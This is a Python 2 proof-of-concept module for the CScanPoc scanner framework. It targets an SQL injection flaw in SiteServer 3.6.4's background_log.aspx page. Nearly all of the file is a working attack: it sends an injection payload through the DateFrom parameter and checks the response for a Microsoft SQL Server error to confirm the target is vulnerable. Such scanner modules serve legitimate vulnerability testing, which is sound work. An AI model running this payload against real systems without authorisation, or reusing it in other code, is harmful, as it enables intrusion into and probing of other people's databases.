# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import  re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'SiteServer_0000' # 平台漏洞编号，留空
    name = 'SiteServer 3.6.4 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-11-20'  # 漏洞公布时间
    desc = '''
        SiteServer最新版3.6.4 /platform/background_log.aspx 存在SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=043523' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'SiteServer'  # 漏洞应用名称
    product_version = '3.6.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1a08a5aa-7116-498b-a532-31e4089da548'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/platform/background_log.aspx?UserName=test&Keyword=1&DateFrom=20120101%27%20and%20@@version=1%20and%201=%27test&DateTo=test"
            code, head, res, errcode, _ = hh.http(arg + payload)
            m = re.search("Microsoft SQL Server",res)
            if m:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()